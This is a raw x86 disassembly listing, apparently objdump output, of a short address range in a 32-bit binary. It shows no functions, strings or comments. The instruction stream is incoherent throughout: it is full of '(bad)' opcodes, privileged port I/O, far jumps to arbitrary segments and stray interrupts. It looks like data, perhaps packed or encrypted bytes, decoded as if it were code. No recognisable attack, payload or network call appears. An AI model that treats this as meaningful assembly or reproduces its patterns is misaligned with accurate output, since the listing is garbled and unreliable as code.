  41715f:	xchg   esi,eax
  417160:	mov    esp,0x466f8a3f
  417165:	sbb    DWORD PTR [esi-0x393d0430],edx
  41716b:	out    0xd0,eax
  41716d:	or     bl,BYTE PTR [eax]
  41716f:	aad    0xab
  417171:	int3   
  417172:	push   ss
  417173:	call   0x1af5:0x721ef73b
  41717a:	mov    ebp,DWORD PTR [ecx+0x4e6e8175]
  417180:	cmp    al,0xcb
  417182:	mov    cl,0x8
  417184:	xor    dl,BYTE PTR [ebp+0x5c]
  417187:	inc    ecx
  417188:	mov    ch,0x27
  41718a:	sub    eax,0xe6a22f08
  41718f:	outs   dx,BYTE PTR ds:[esi]
  417190:	or     DWORD PTR [edx+0x5c46ce32],esp
  417196:	(bad)  
  417197:	mov    ah,0x55
  417199:	jmp    0xec73568f
  41719e:	cld    
  41719f:	scas   eax,DWORD PTR es:[edi]
  4171a0:	inc    esi
  4171a1:	std    
  4171a2:	push   es
  4171a3:	scas   eax,DWORD PTR es:[edi]
  4171a4:	mov    bh,0xd8
  4171a6:	aaa    
  4171a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171a8:	mul    BYTE PTR [ebx-0x80]
  4171ab:	(bad)  
  4171ac:	sbb    al,0x3f
  4171ae:	shr    DWORD PTR [ebx-0x7b825a82],1
  4171b4:	inc    eax
  4171b5:	push   ss
  4171b6:	std    
  4171b7:	cwde   
  4171b8:	dec    edx
  4171b9:	ja     0x417198
  4171bb:	push   edx
  4171bc:	dec    edi
  4171bd:	les    edx,FWORD PTR [edx+eax*4+0x5f43339b]
  4171c4:	bound  esi,QWORD PTR [eax]
  4171c6:	or     BYTE PTR [edx-0x1656b180],dl
  4171cc:	es pusha 
  4171ce:	std    
  4171cf:	cdq    
  4171d0:	test   BYTE PTR [edx-0x70],cl
  4171d3:	not    ebx
  4171d5:	dec    ecx
  4171d6:	or     BYTE PTR [edx-0x5e2bb3f5],dh
  4171dc:	push   edi
  4171dd:	push   edx
  4171de:	in     eax,0xd7
  4171e0:	loope  0x4171b4
  4171e2:	dec    ebp
  4171e3:	mov    ebp,0x6342632f
  4171e8:	jnp    0x417206
  4171ea:	add    esi,DWORD PTR [eax]
  4171ec:	outs   dx,DWORD PTR ds:[esi]
  4171ed:	out    0x55,al
  4171ef:	aad    0xc4
  4171f1:	pop    esi
  4171f2:	bound  edx,QWORD PTR [eax]
  4171f4:	lds    eax,FWORD PTR [ebx]
  4171f6:	pushf  
  4171f7:	push   esp
  4171f8:	mov    al,0x89
  4171fa:	or     dh,BYTE PTR [eax]
  4171fc:	push   esi
  4171fd:	std    
  4171fe:	or     ch,BYTE PTR [edi]
  417200:	in     al,dx
  417201:	push   0xed298398
  417206:	and    BYTE PTR [esi-0x50e9372f],bh
  41720c:	retf   
  41720d:	push   edi
  41720e:	cli    
  41720f:	dec    eax
  417210:	mov    edi,0xf333c037
  417215:	dec    ebp
  417216:	ins    BYTE PTR es:[edi],dx
  417217:	lods   eax,DWORD PTR ds:[esi]
  417218:	(bad)  
  417219:	mov    ebx,0x6f98ff64
  41721e:	aad    0x63
  417220:	sbb    BYTE PTR [edi-0xb],ch
  417223:	cmp    BYTE PTR [edi+0x52b9d456],0x50
  41722a:	icebp  
  41722b:	pop    esp
  41722c:	sub    BYTE PTR [eax*4+0x5a0633c7],al
  417233:	les    ecx,FWORD PTR [ecx]
  417235:	mov    eax,ds:0x6534ab85
  41723a:	pop    es
  41723b:	xchg   esp,eax
  41723c:	aad    0xac
  41723e:	(bad)  
  41723f:	test   al,0xb7
  417241:	(bad)
  417244:	sub    DWORD PTR [edx-0x369657ef],edi
  41724a:	(bad)  
  41724b:	mov    ebp,0x13f59d50
  417250:	out    0xd5,eax
  417252:	(bad)  
  417253:	sbb    DWORD PTR [ebx],ebp
  417255:	mov    ds:0x23fd058,eax
  41725a:	add    DWORD PTR gs:[ebx+0x5e],ecx
  41725e:	test   eax,0x5b216d82
  417263:	fimul  DWORD PTR [ecx]
  417265:	xor    BYTE PTR [ebp+edx*2+0x46],ch
  417269:	and    bh,BYTE PTR [ebx+0x15048491]
  41726f:	xchg   ebx,eax
  417270:	cs pop ds
  417272:	inc    ebp
  417273:	mov    bl,0x74
  417275:	scas   eax,DWORD PTR es:[edi]
  417276:	rol    BYTE PTR [esi],1
  417278:	xchg   edi,eax
  417279:	sub    al,0x53
  41727b:	mov    ebx,0x5b71a9f8
  417280:	dec    eax
  417281:	(bad)  
  417283:	fld    QWORD PTR [eax]
  417285:	or     ebp,ecx
  417287:	aam    0x33
  417289:	test   BYTE PTR [edx+ebx*2+0x2c],bl
  41728d:	or     edi,DWORD PTR [esi]
  41728f:	fadd   QWORD PTR [edi+ebp*1]
  417292:	(bad)  
  417293:	xchg   edx,eax
  417294:	add    eax,DWORD PTR [esi-0x49f83b5f]
  41729a:	cwde   
  41729b:	scas   al,BYTE PTR es:[edi]
  41729c:	(bad)  
  41729d:	or     BYTE PTR [eax+0x55],dh
  4172a0:	jge    0x41729f
  4172a2:	outs   dx,BYTE PTR ds:[esi]
  4172a3:	or     DWORD PTR [ecx+0x76],0x99501772
  4172aa:	fcom   DWORD PTR [esi+0x7d6d1b27]
  4172b0:	adc    BYTE PTR [ecx],ch
  4172b2:	int    0xf7
  4172b4:	popa   
  4172b5:	mov    esp,0x606f1a4e
  4172ba:	je     0x417275
  4172bc:	es popa 
  4172be:	pushf  
  4172bf:	sub    al,BYTE PTR [edx-0x6df9af62]
  4172c5:	cmp    DWORD PTR [edx-0x11],eax
  4172c8:	fwait
  4172c9:	dec    ebx
  4172ca:	xchg   BYTE PTR [esi],ch
  4172cc:	out    0x9b,eax
  4172ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4172cf:	cmp    DWORD PTR [ebp-0x4c],ebx
  4172d2:	int3   
  4172d3:	out    dx,eax
  4172d4:	or     DWORD PTR [ebx-0x20],edx
  4172d7:	arpl   WORD PTR ds:0xad20b2ba,bx
  4172dd:	vpminub ymm7,ymm2,YMMWORD PTR [esi]
  4172e1:	xchg   ecx,eax
  4172e2:	mov    esi,esi
  4172e4:	push   ebx
  4172e5:	fs daa 
  4172e7:	mov    ecx,0x2e789f82
  4172ec:	pop    ebp
  4172ed:	repz in al,dx
  4172ef:	sar    DWORD PTR [edi-0x10],1
  4172f2:	adc    BYTE PTR [eax+0x55aa3258],ah
  4172f8:	mov    esi,0xb15a0be0
  4172fd:	cdq    
  4172fe:	lock cwde 
  417300:	and    al,0xb6
  417302:	outs   dx,BYTE PTR ds:[esi]
  417303:	daa    
  417304:	loope  0x41734f
  417306:	retf   0xcf95
  417309:	mov    bl,0x23
  41730b:	in     al,dx
  41730c:	inc    esp
  41730d:	pop    ebp
  41730e:	fcom   QWORD PTR [ebx]
  417310:	mov    cl,0x27
  417312:	pop    edx
  417313:	jno    0x41734f
  417315:	stos   BYTE PTR es:[edi],al
  417316:	sahf   
  417317:	sbb    dh,bl
  417319:	and    al,0xe
  41731b:	std    
  41731c:	or     cl,dl
  41731e:	scas   al,BYTE PTR es:[edi]
  41731f:	jno    0x41734c
  417321:	pop    ebx
  417322:	or     eax,0xc7fb6e50
  417327:	add    dl,cl
  417329:	mov    dh,0x26
  41732b:	outs   dx,BYTE PTR ds:[esi]
  41732c:	js     0x417392
  41732e:	and    BYTE PTR [edx],dh
  417330:	adc    bl,dl
  417332:	pop    edi
  417333:	and    al,0x5e
  417335:	imul   esp,DWORD PTR [ebp+0x59],0x2e
  417339:	stos   BYTE PTR es:[edi],al
  41733a:	xchg   edx,eax
  41733b:	jge    0x4172f9
  41733d:	pop    ebp
  41733e:	or     BYTE PTR [ecx],cl
  417340:	fsub   QWORD PTR [ecx]
  417342:	push   cs
  417343:	pop    ss
  417344:	xor    ah,BYTE PTR [ecx-0x36ede4f4]
  41734a:	(bad)  
  41734b:	sub    al,0x79
  41734d:	mov    ah,0x10
  41734f:	sbb    dh,bh
  417351:	push   edx
  417352:	cmp    DWORD PTR [edx+0xb],ebp
  417355:	(bad)
  417358:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417359:	inc    eax
  41735a:	gs mov ah,0x8e
  41735d:	fadd   QWORD PTR [edx]
  41735f:	push   ss
  417360:	push   ecx
  417361:	jbe    0x4172ec
  417363:	lock xchg esp,eax
  417365:	mov    edx,0x85200607
  41736a:	inc    ebp
  41736b:	in     al,dx
  41736c:	or     DWORD PTR [edi+0x55],esp
  41736f:	adc    ecx,ebp
  417371:	cmp    edi,DWORD PTR [ecx-0x5a]
  417374:	mov    dl,bl
  417376:	mov    eax,0x29d775d1
  41737b:	cli    
  41737c:	addr16 sbb eax,0x5673f8ce
  417383:	loopne 0x417361
  417385:	xchg   esp,eax
  417386:	jmp    0xe1ea:0xb7630573
  41738d:	jae    0x417392
  41738f:	int    0x65
  417391:	mov    al,ds:0x1e640242
  417396:	mov    dl,0xdb
  417398:	fist   WORD PTR [edi-0x3]
  41739b:	sbb    eax,0xe6f83be9
  4173a0:	mov    ds,esp
  4173a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4173a3:	std    
  4173a4:	pop    ebp
  4173a5:	outs   dx,BYTE PTR ds:[esi]
  4173a6:	int3   
  4173a7:	(bad)  
  4173a8:	mov    ds:0x68cd8a70,eax
  4173ad:	shl    ecx,cl
  4173af:	pushf  
  4173b0:	stos   DWORD PTR es:[edi],eax
  4173b1:	ja     0x4173ba
  4173b3:	arpl   sp,bp
  4173b5:	rol    DWORD PTR [esi+0x5d960e],cl
  4173bb:	repnz test BYTE PTR ds:0xa70fc20c,0x8b
  4173c3:	in     al,0x68
  4173c5:	fwait
  4173c6:	gs out 0x35,eax
  4173c9:	fst    DWORD PTR [ebx+0x16f92a51]
  4173cf:	ficomp WORD PTR [ebx+ebx*2]
  4173d2:	fcmovb st,st(3)
  4173d4:	mov    ds:0x31ae594,al
  4173d9:	adc    al,0x6c
  4173db:	sub    BYTE PTR [ebp+ebx*2-0x18ad5e7c],bl
  4173e2:	sbb    DWORD PTR [edi-0x7242ccc8],0x9177f849
  4173ec:	and    DWORD PTR [eax-0x499ff202],edx
  4173f2:	sbb    BYTE PTR [ebx+0x7a7c2881],dl
  4173f8:	pop    ebp
  4173f9:	jecxz  0x41744c
  4173fb:	retf   0xd11f
  4173fe:	out    dx,al
  4173ff:	dec    edi
  417400:	data16 int3 
  417402:	fcmovnu st,st(6)
  417404:	in     eax,0xb5
  417406:	or     BYTE PTR [esi],ah
  417408:	xchg   ebp,eax
  417409:	push   cs
  41740a:	in     al,dx
  41740b:	jg     0x41739d
  41740d:	sub    cl,cl
  41740f:	or     BYTE PTR [edi-0x668e04f9],ah
  417415:	sub    cl,BYTE PTR [ecx+0x33]
  417418:	aas    
  417419:	add    BYTE PTR [edx-0x15],dh
  41741c:	(bad)  
  41741d:	xchg   ebp,eax
  41741e:	pushf  
  41741f:	xchg   ecx,eax
  417420:	fmul   DWORD PTR [ebx]
  417422:	add    DWORD PTR ds:0xbd85946c,ebx
  417428:	jae    0x4173eb
  41742a:	mov    ebp,0xe6a382ff
  41742f:	iret   
  417430:	fidivr DWORD PTR [edx+0x59622f56]
  417436:	retf   0x8013
  417439:	stos   BYTE PTR es:[edi],al
  41743a:	adc    eax,0x66ee25b4
  41743f:	fisttp WORD PTR [esi+eiz*2-0x787bdda6]
  417446:	test   eax,0x8d72f0fe
  41744b:	pop    ss
  41744c:	mov    ebx,0xa190e8ab
  417451:	pop    esp
  417452:	int    0x31
  417454:	pop    eax
  417455:	mov    eax,ds:0x2b015057
  41745a:	hlt    
  41745b:	shl    ecx,cl
  41745d:	pop    edi
  41745e:	lea    ebp,[edx-0x48]
  417461:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417462:	fstp   DWORD PTR [ebp+0x7f]
  417465:	icebp  
  417466:	je     0x417461
  417468:	or     ebx,DWORD PTR [edi]
  41746a:	xchg   BYTE PTR [edx-0xf],dl
  41746d:	(bad)  
  41746e:	shr    DWORD PTR [ecx+edx*8],cl
  417471:	dec    ebp
  417472:	adc    edi,DWORD PTR [esi+ebx*1-0x12]
  417476:	(bad)  
  417477:	out    0xb9,eax
  417479:	sub    edx,eax
  41747b:	retf   0xe3e0
  41747e:	mov    cl,0x65
  417480:	adc    ch,cl
  417482:	sbb    BYTE PTR [edi],bh
  417484:	cmp    al,0x61
  417486:	lods   eax,DWORD PTR ds:[esi]
  417487:	dec    ebx
  417488:	adc    BYTE PTR [ebp-0x74],0xa
  41748c:	daa    
  41748d:	addr16 pop ecx
  41748f:	pop    ds
  417490:	mov    ebp,es
  417492:	adc    edx,DWORD PTR [esi+0xe6b0c24]
  417498:	jnp    0x4174f5
  41749a:	je     0x417488
  41749c:	push   esp
  41749d:	push   edx
  41749e:	push   cs
  41749f:	popf   
  4174a0:	xchg   esi,eax
  4174a1:	fs les ecx,FWORD PTR ds:[ecx+0x7b]
  4174a6:	jecxz  0x417519
  4174a8:	loope  0x4174bc
  4174aa:	rcr    BYTE PTR [edi],0x41
  4174ad:	jg     0x417482
  4174af:	xor    BYTE PTR [edx+0x4],ah
  4174b2:	adc    cl,BYTE PTR [edi+0x25544f70]
  4174b8:	clc    
  4174b9:	sub    bl,BYTE PTR [ebp+ebp*1-0x6f49ffde]
  4174c0:	pop    ebx
  4174c1:	cmp    eax,0x72207619
  4174c6:	retf   
  4174c7:	xchg   esp,eax
  4174c8:	or     eax,0x10ffb7bd
  4174cd:	in     eax,dx
  4174ce:	xchg   edx,eax
  4174cf:	lahf   
  4174d0:	mov    ecx,0x8966286d
  4174d5:	test   BYTE PTR [esp+esi*4-0x30],dl
  4174d9:	arpl   WORD PTR [ecx],ax
  4174db:	ss xchg ebx,eax
  4174dd:	mov    cs,WORD PTR [ebp+0x27]
  4174e0:	and    BYTE PTR [edi-0x45a32000],bh
  4174e6:	xlat   BYTE PTR ds:[ebx]
  4174e7:	mov    dh,0xec
  4174e9:	dec    ebx
  4174ea:	jns    0x417485
  4174ec:	pop    eax
  4174ed:	cdq    
  4174ee:	jo     0x41754c
  4174f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174f1:	sahf   
  4174f2:	(bad)  
  4174f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174f4:	popf   
  4174f5:	lods   al,BYTE PTR ds:[esi]
  4174f6:	shl    DWORD PTR [esi+0x12],0x11
  4174fa:	outs   dx,BYTE PTR ds:[esi]
  4174fb:	out    dx,eax
  4174fc:	jmp    0x41751f
  4174fe:	jmp    0x417505
  417500:	add    DWORD PTR ds:0x9c08dec4,esi
  417506:	test   DWORD PTR [esi+0xa4f9961],ecx
  41750c:	jno    0x4174b9
  41750e:	inc    edx
  41750f:	loop   0x41758c
  417511:	retf   
  417512:	int    0xde
  417514:	repnz (bad) 
  417517:	mov    esi,edi
  417519:	cmp    esi,DWORD PTR [ebx-0x6fdb7a0]
  41751f:	jbe    0x417559
  417521:	adc    al,0x10
  417523:	inc    esp
  417524:	out    0x5e,al
  417526:	stos   BYTE PTR es:[edi],al
  417527:	ss inc ebx
  417529:	dec    edi
  41752a:	clc    
  41752b:	pop    ecx
  41752c:	jnp    0x41755b
  41752e:	call   0x3262:0xd2644405
  417535:	sub    DWORD PTR [esi],edi
  417537:	loope  0x417567
  417539:	pusha  
  41753a:	push   0x76
  41753c:	inc    eax
  41753d:	pop    es
  41753e:	es jnp 0x41751f
  417541:	(bad)  
  417542:	mov    ds:0xccf68836,eax
  417547:	icebp  
  417548:	loopne 0x41753e
  41754a:	xchg   ebx,eax
  41754b:	pop    ds
  41754c:	push   ebx
  41754d:	xor    cl,al
  41754f:	xor    DWORD PTR [edi+0x3d],esi
  417552:	call   0x165:0x3d257917
  417559:	(bad)  
  41755b:	test   BYTE PTR [ebx+0x1bd3350b],al
  417561:	mov    al,0x18
  417563:	das    
  417564:	adc    eax,0xa319bd5
  417569:	retf   
  41756a:	aas    
  41756b:	lds    edi,FWORD PTR ds:0xdbf7db1f
  417571:	mov    eax,0x8aba4085
  417576:	inc    ebp
  417577:	in     al,0x1d
  417579:	or     BYTE PTR [ecx+0x11],dh
  41757c:	inc    ebx
  41757d:	mov    edx,0x49fbb25b
  417582:	cld    
  417583:	xchg   esi,eax
  417584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417585:	pop    ebp
  417586:	out    dx,eax
  417587:	sti    
  417588:	fwait
  417589:	mov    dl,0xce
  41758b:	jbe    0x4175e8
  41758d:	imul   esi,DWORD PTR [edx],0xf22216b7
  417593:	adc    eax,0x4aece6a9
  417598:	sbb    eax,0xb68556ca
  41759d:	jo     0x417553
  41759f:	add    edx,0xbf036708
  4175a5:	mov    eax,0xa0b93ab7
  4175aa:	lds    ebx,FWORD PTR [ecx-0x6]
  4175ad:	test   al,0xdb
  4175af:	adc    bh,BYTE PTR [edx]
  4175b1:	mov    dl,0x95
  4175b3:	add    bh,BYTE PTR [ebx+0x341d8c62]
  4175b9:	cwde   
  4175ba:	arpl   si,cx
  4175bc:	jmp    0xecea:0x8e1af420
  4175c3:	(bad)  
  4175c5:	push   es
  4175c6:	xor    esp,esp
  4175c8:	mov    edi,0x50407fd9
  4175cd:	mov    eax,ds:0x501bef4a
  4175d2:	js     0x4175bd
  4175d4:	fiadd  WORD PTR [ebx]
  4175d6:	lods   eax,DWORD PTR ds:[esi]
  4175d7:	repnz push ss
  4175d9:	and    eax,0xbe0bb3d6
  4175de:	mov    ds:0xba2b695e,al
  4175e3:	jp     0x417595
  4175e5:	mov    esi,0xddd5f967
  4175ea:	fimul  WORD PTR [esi]
  4175ec:	das    
  4175ed:	mov    edi,0x48e33cf4
  4175f2:	or     cl,0x1a
  4175f5:	mov    cl,0xfa
  4175f7:	sbb    eax,0x546a0cda
  4175fc:	aad    0x7c
  4175fe:	clc    
  4175ff:	pop    ebp
  417600:	(bad)  
  417601:	adc    DWORD PTR [ecx],esi
  417603:	out    0x39,eax
  417605:	fld    DWORD PTR [ecx-0x475f6aa6]
  41760b:	test   al,0x4b
  41760d:	mov    edx,0x939d19b4
  417612:	inc    ebx
  417613:	ret    
  417614:	lock retf 
  417616:	push   cs
  417617:	or     cl,BYTE PTR [eax+0x11c8f4e9]
  41761d:	mov    al,0xca
  41761f:	stc    
  417620:	mov    BYTE PTR [edi-0x5e0a807],bh
  417626:	lahf   
  417627:	bnd jle 0x417682
  41762a:	inc    ebx
  41762b:	(bad)  ds:0x9da08459
  417631:	sbb    dl,BYTE PTR [edi+0x37]
  417634:	adc    dl,BYTE PTR [ecx]
  417636:	cwde   
  417637:	fnsave [ebx]
  417639:	retf   0xf174
  41763c:	dec    BYTE PTR [ebx+0x55]
  41763f:	loopne 0x41769d
  417641:	xor    al,0xda
  417643:	mov    dh,0xe4
  417645:	data16 adc BYTE PTR [ecx+0xe],bh
  417649:	imul   esp,DWORD PTR [eax+0x30],0x9f51ca8e
  417650:	mov    ds:0xc18f59a8,eax
  417655:	and    eax,0x7cd9a4c5
  41765a:	jo     0x41762a
  41765c:	aam    0x7a
  41765e:	mov    edx,0x97302250
  417663:	cwde   
  417664:	int3   
  417665:	stc    
  417666:	dec    esi
  417667:	xor    BYTE PTR [ebp-0x5d],0xef
  41766b:	dec    ecx
  41766c:	leave  
  41766d:	xchg   ecx,eax
  41766e:	stos   BYTE PTR es:[edi],al
  41766f:	sar    esi,1
  417671:	sahf   
  417672:	xchg   edi,eax
  417673:	push   ebp
  417674:	outs   dx,BYTE PTR ds:[esi]
  417675:	nop    DWORD PTR [ecx+0x62]
  417679:	idiv   bl
  41767b:	(bad)  
  41767c:	xchg   esp,eax
  41767d:	push   0x36370cff
  417682:	int    0x7d
  417684:	add    ch,cl
  417686:	fnstsw WORD PTR [eax]
  417688:	adc    al,0x9f
  41768a:	sbb    ebp,edi
  41768c:	sbb    ah,BYTE PTR [esi]
  41768e:	adc    al,0x80
  417690:	pop    ss
  417691:	imul   edx,DWORD PTR [ebx-0x32],0x6c96eb6a
  417698:	push   ebp
  417699:	daa    
  41769a:	cmp    eax,0x525a0582
  41769f:	leave  
  4176a0:	fadd   DWORD PTR [edx+0x14]
  4176a3:	jp     0x4176ce
  4176a5:	fnsave [ecx-0x41]
  4176a8:	iret   
  4176a9:	jae    0x4176e4
  4176ab:	push   esi
  4176ac:	dec    edi
  4176ad:	lock fadd DWORD PTR [eax-0x37d136f7]
  4176b4:	les    ebx,FWORD PTR [ebp-0x34]
  4176b7:	xchg   esi,eax
  4176b8:	popa   
  4176b9:	sbb    BYTE PTR [esi-0xdbcdbd6],al
  4176bf:	push   ebp
  4176c0:	mov    ss,WORD PTR [esi+0x2c20f434]
  4176c6:	jns    0x4176e4
  4176c8:	out    0x8f,al
  4176ca:	daa    
  4176cb:	data16 stos BYTE PTR es:[edi],al
  4176cd:	aas    
  4176ce:	icebp  
  4176cf:	push   0xffffffea
  4176d1:	jecxz  0x41767b
  4176d3:	bound  edi,QWORD PTR [ecx-0x50]
  4176d6:	and    al,0x6c
  4176d8:	lahf   
  4176d9:	scas   al,BYTE PTR es:[edi]
  4176da:	mov    ebx,0xec22915d
  4176df:	stc    
  4176e0:	into   
  4176e1:	fs inc esp
  4176e3:	push   esi
  4176e4:	(bad)  
  4176e5:	scas   al,BYTE PTR es:[edi]
  4176e6:	or     BYTE PTR ds:0xc01b2c9,ah
  4176ec:	mov    ch,0x34
  4176ee:	shr    DWORD PTR [edi-0x11dfe3cb],1
  4176f4:	sub    ebx,DWORD PTR [eax-0x7f1c15ad]
  4176fa:	pusha  
  4176fb:	jae    0x4176f5
  4176fd:	dec    ebp
  4176fe:	mov    dh,0x4e
  417700:	aad    0xa7
  417702:	adc    eax,0xd5f840f7
  417707:	xchg   esp,eax
  417708:	mov    eax,0x91713877
  41770d:	ret    
  41770e:	cmp    DWORD PTR [ecx-0x28],eax
  417711:	push   eax
  417712:	imul   eax,edi,0xffffffc0
  417715:	pushf  
  417716:	sbb    ebp,DWORD PTR [ecx+0x4c]
  417719:	ja     0x417763
  41771b:	jne    0x417713
  41771d:	sub    al,0xfe
  41771f:	or     ebx,eax
  417721:	push   cs
  417722:	into   
  417723:	push   ebx
  417724:	dec    eax
  417725:	aaa    
  417726:	mov    al,ds:0x8c11af25
  41772b:	jno    0x4177a3
  41772d:	xchg   esp,eax
  41772e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41772f:	push   esp
  417730:	imul   edx,DWORD PTR [edi+0x3e],0xfc0eb91a
  417737:	sbb    esp,DWORD PTR [eax-0x16]
  41773a:	pusha  
  41773b:	jnp    0x4176d8
  41773d:	cmp    dl,BYTE PTR [ecx-0x26]
  417740:	pop    ecx
  417741:	mov    ah,0x4
  417743:	icebp  
  417744:	mov    al,dl
  417746:	push   0x83381031
  41774b:	cmp    esi,edi
  41774d:	pop    ds
  41774e:	ror    ecx,0xae
  417751:	pop    ebp
  417752:	jbe    0x417791
  417754:	out    dx,al
  417755:	dec    edx
  417756:	add    ebp,DWORD PTR [ebp+0x12]
  417759:	adc    DWORD PTR [edx-0x3082a3f5],0x20
  417760:	adc    eax,ebx
  417762:	(bad)
  417767:	push   eax
  417768:	sbb    BYTE PTR [esi],dl
  41776a:	jno    0x41775d
  41776c:	cs out dx,eax
  41776e:	data16 je 0x417703
  417771:	popa   
  417772:	dec    eax
  417773:	repnz mov bh,0xca
  417776:	xor    esp,0x5fee14d8
  41777c:	fiadd  DWORD PTR [ecx+0x4bc1ff20]
  417782:	mov    ebp,0x8ad093bb
  417787:	rcr    BYTE PTR [eax],0xd9
  41778a:	pop    eax
  41778b:	ss pop eax
  41778d:	and    eax,0x1640326a
  417792:	idiv   dh
  417794:	adc    edi,ecx
  417796:	dec    esi
  417797:	enter  0x3255,0x1
  41779b:	test   al,0xa
  41779d:	and    eax,0x152dc4
  4177a2:	popf   
  4177a3:	ret    
  4177a4:	sub    al,0xf7
  4177a6:	(bad)  
  4177a7:	aad    0xd1
  4177a9:	add    DWORD PTR [eax+0x4389c286],ebx
  4177af:	mov    DWORD PTR [edi+edx*8],esi
  4177b2:	push   edx
  4177b3:	mov    edx,0x9890c95a
  4177b8:	(bad)  
  4177b9:	pop    esi
  4177ba:	test   BYTE PTR [edi-0xb],cl
  4177bd:	adc    al,0xa5
  4177bf:	and    ebp,eax
  4177c1:	dec    esp
  4177c2:	mov    DWORD PTR [edx+0x4adb678d],esp
  4177c8:	pop    esp
  4177c9:	cdq    
  4177ca:	fstp   QWORD PTR [ecx]
  4177cc:	push   ebx
  4177cd:	cdq    
  4177ce:	sbb    cl,bh
  4177d0:	rol    DWORD PTR [ebx],0x8f
  4177d3:	arpl   WORD PTR [ecx-0x43],bp
  4177d6:	jl     0x417779
  4177d8:	daa    
  4177d9:	inc    esp
  4177da:	out    dx,eax
  4177db:	push   es
  4177dc:	cs nop
  4177de:	adc    al,0xc6
  4177e0:	in     eax,dx
  4177e1:	ds push esi
  4177e3:	and    al,0x11
  4177e5:	sub    esp,DWORD PTR ds:0xa7655a3e
  4177eb:	adc    al,0x6f
  4177ed:	mov    eax,ds:0x92d68f66
  4177f2:	adc    eax,0x313cab00
  4177f7:	dec    esi
  4177f8:	(bad)  
  4177f9:	mov    bl,BYTE PTR [edi+0x7dfa821c]
  4177ff:	adc    DWORD PTR [esi-0x42],0xffffff96
  417803:	mov    eax,ds:0x1f21319
  417808:	mov    ds:0x9373d1b,eax
  41780d:	inc    ecx
  41780e:	adc    al,0xa5
  417810:	imul   eax,ecx,0xf2103aad
  417816:	ss jb  0x4177ff
  417819:	mov    ds,WORD PTR [ebp-0x391569b5]
  41781f:	daa    
  417820:	leave  
  417821:	push   0x155a054c
  417826:	call   ecx
  417828:	retf   0x6eb0
  41782b:	call   DWORD PTR [edi+0x0]
  41782e:	lea    ecx,[edi+0x5e]
  417831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417832:	or     eax,0xba84de3
  417837:	push   edi
  417838:	cmp    al,0x48
  41783a:	fwait
  41783b:	int3   
  41783c:	sbb    eax,0x9b75540d
  417841:	push   esp
  417842:	dec    ecx
  417843:	xchg   esp,eax
  417844:	(bad)  
  417846:	sub    bh,BYTE PTR [edx]
  417848:	fldenv [eax+0x245324bf]
  41784e:	pop    esp
  41784f:	push   edx
  417850:	iret   
  417851:	mov    WORD PTR [edx],gs
  417853:	add    eax,DWORD PTR [ebx-0x1fecc780]
  417859:	pop    ecx
  41785a:	and    DWORD PTR [esi+esi*1+0x3f2b7481],0xffffffb1
  417862:	pop    es
  417863:	pusha  
  417864:	cdq    
  417865:	mov    edx,0x504eda47
  41786a:	cmc    
  41786b:	sti    
  41786c:	sub    eax,0x763f5e3c
  417871:	ins    DWORD PTR es:[edi],dx
  417872:	ins    DWORD PTR es:[edi],dx
  417873:	cmp    eax,edi
  417875:	add    ch,BYTE PTR [eax+esi*8-0x7a]
  417879:	les    ecx,FWORD PTR [esp+eiz*2-0x6f]
  41787d:	popa   
  41787e:	and    BYTE PTR [eax+0x2f5f4caa],al
  417884:	push   0xe70f4f0
  417889:	pop    eax
  41788a:	inc    ecx
  41788b:	in     eax,dx
  41788c:	sar    ecx,0x6a
  41788f:	xor    DWORD PTR [ecx+0x4a9388ef],edi
  417895:	and    ah,ah
  417897:	jne    0x417829
  417899:	mov    BYTE PTR [edx-0x48],dl
  41789c:	adc    eax,0x7552ef14
  4178a1:	(bad)  [edx-0x2f]
  4178a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178a5:	scas   al,BYTE PTR es:[edi]
  4178a6:	scas   al,BYTE PTR es:[edi]
  4178a7:	xchg   BYTE PTR [edx],dh
  4178a9:	adc    bl,BYTE PTR ds:0xbb3e2bc4
  4178af:	fimul  DWORD PTR [ecx]
  4178b1:	mov    ds:0xd37f956b,al
  4178b6:	cmp    DWORD PTR [edi-0xd],edi
  4178b9:	dec    eax
  4178ba:	mov    dl,0xf7
  4178bc:	or     eax,0xeb54ee63
  4178c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c2:	fwait
  4178c3:	scas   eax,DWORD PTR es:[edi]
  4178c4:	pop    esi
  4178c5:	jle    0x417899
  4178c7:	sbb    BYTE PTR [ebp+0x43],bh
  4178ca:	fmul   DWORD PTR [ebp-0x571d52d3]
  4178d0:	jge    0x41791e
  4178d2:	push   edx
  4178d3:	sbb    ebx,DWORD PTR [ebp-0x5f4d8798]
  4178d9:	sbb    BYTE PTR [ecx],bl
  4178db:	in     al,dx
  4178dc:	jnp    0x417918
  4178de:	push   0x59da8990
  4178e3:	or     edi,DWORD PTR ss:[eax+0x6e091569]
  4178ea:	xor    al,0xf0
  4178ec:	mov    esp,0xdfa1cab7
  4178f1:	std    
  4178f2:	mov    ecx,0x23770443
  4178f7:	popf   
  4178f8:	add    al,0x31
  4178fa:	xchg   ebx,eax
  4178fb:	outs   dx,DWORD PTR es:[esi]
  4178fd:	jmp    0xfd874bd5
  417902:	push   eax
  417903:	xor    al,dl
  417905:	pop    edx
  417906:	mov    bh,0x90
  417908:	fcom   QWORD PTR [edi+0x2c6f76db]
  41790e:	repz pop ss
  417910:	pop    edi
  417911:	out    dx,al
  417912:	stos   BYTE PTR es:[edi],al
  417913:	inc    ebx
  417914:	iret   
  417915:	push   ebp
  417916:	into   
  417917:	or     al,0xf6
  417919:	js     0x41798c
  41791b:	into   
  41791c:	cdq    
  41791d:	pop    ebx
  41791e:	mov    bh,0xb2
  417920:	xchg   BYTE PTR [edi],dh
  417922:	mov    bh,0x90
  417924:	dec    eax
  417925:	adc    dh,bh
  417927:	push   cs
  417928:	leave  
  417929:	dec    edx
  41792a:	fs (bad) 
  41792c:	gs push ebx
  41792e:	outs   dx,BYTE PTR ds:[esi]
